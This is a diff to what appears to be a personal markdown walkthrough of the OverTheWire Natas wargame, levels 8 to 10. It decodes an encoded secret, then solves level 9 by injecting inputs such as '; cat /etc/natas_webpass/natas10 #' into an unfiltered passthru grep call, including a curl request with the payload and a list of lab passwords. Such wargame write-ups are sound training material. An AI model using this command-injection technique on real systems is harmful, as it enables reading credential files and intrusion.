@@ -1,4 +1,4 @@
-# Natas  
+# Natas - Overthewrite  
 
 Natas teaches the basics of serverside web-security.  
 
@@ -298,23 +298,107 @@ if(array_key_exists("submit", $_POST)) {
 
 Ya `secretCode` &rarr; bin2hex &rarr; strrev &rarr; base64_encode &rarr; `encodedSecret`  
 
-We should decrypt the `encodedSecret` 
+We should decrypt the `encodedSecret` using php script  
 
+```php
+echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
+```
 
 ## Level 9
 
+```bash
+curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org/
+```
+
+![image](https://user-images.githubusercontent.com/31420144/105504746-b8fb7a00-5cfa-11eb-80bb-36f9347a7d86.png)
+
+We should view sourcecode  
+
+Consider this piece of code  
+
+```php
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+</pre>
+```
+
+Notify that the php script does not filter special characters (e.g `;`)
+
+I'm solving this level using browser input form  
+
+* Try inputting `; ls . #` &rarr; the passthru command will be `grep -i ; ls . # dictionary.txt` &rarr; no hint
+* Try inputting `; ls /etc #` &rarr; the passthru command will be `grep -i ; ls /etc # dictionary.txt` &rarr; we've found the file `natas_webpass` in the list
+* Try inputting `; ls /etc/natas_webpass #` &rarr; the passthru command will be `grep -i ; ls /etc/natas_webpass # dictionary.txt`
+
+![image](https://user-images.githubusercontent.com/31420144/105506911-28726900-5cfd-11eb-8482-0d5b6de9142b.png)
+
+
+* Finally inputting `; cat /etc/natas_webpass/natas10 #` &rarr; we've got the password
+
+Excuse me, I copied the following url from a GET request in Chrome Developer Tools _http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas\_webpass%2Fnatas10+%23&submit=Search_   
+
+```bash
+curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl --data "&submit=Submit+Query" http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10+%23&submit=Search
+```
+
 ## Level 10
 
-## TLDR; solution
+```bash
+curl --silent --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/
+```
 
-natas0 - `natas0`  
-natas1 - `gtVrDuiDfck831PqWsLEZy5gyDz1clto`  
-natas2 - `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`  
-natas3 - `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`  
-natas4 - `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`  
-natas5 - `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`  
-natas6 - `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`    
-natas7 - `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`  
-natas8 - `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`    
-natas9 - ` `  
-natas10 - ` `    
+We should view sourcecode  
+
+```php
+For security reasons, we now filter on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+</pre>
+```
+
+They now **filtered** special characters `;`, `|`, `&`  
+
+## tldr; solution
+
+natas0  - `natas0`  
+natas1  - `gtVrDuiDfck831PqWsLEZy5gyDz1clto`  
+natas2  - `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`  
+natas3  - `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`  
+natas4  - `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`  
+natas5  - `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`  
+natas6  - `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`    
+natas7  - `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`  
+natas8  - `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`    
+natas9  - `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`  
+natas10 - `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`    
